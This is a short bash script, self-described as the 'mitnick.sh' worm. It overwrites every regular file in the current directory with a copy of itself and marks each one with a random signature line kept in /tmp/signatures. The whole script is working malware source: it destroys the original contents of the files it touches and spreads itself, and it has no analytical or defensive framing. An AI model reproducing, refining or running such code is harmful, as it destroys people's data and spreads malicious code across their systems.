

generate_signature() {
    # Append a random number to the file
    echo $RANDOM >> /tmp/signatures
}

generate_signature

for f in *; do
    # Check if the file is a directory
    if [ -d "$f" ]; then
        # If it is a directory, then skip it
        continue
    fi

    if [ "$f" = "mitnick.sh" ]; then
        # If it is the worm itself, then skip it
        continue
    fi

    # Check if the first line of the file
    # is a comment line contained in the /tmp/signatures file
    if head -n 1 "$f" | grep -q -f /tmp/signatures; then
        # If it is infected, then skip it
        continue
    fi

    # Get last line of the /tmp/signatures file
    last_signature=$(tail -n 1 /tmp/signatures)

    cat mitnick.sh >> "$f.tmp"

    #Insert the last signature in the file header
    sed -i "1s/^/$last_signature\n/" "$f.tmp"

    mv "$f.tmp" "$f"
done
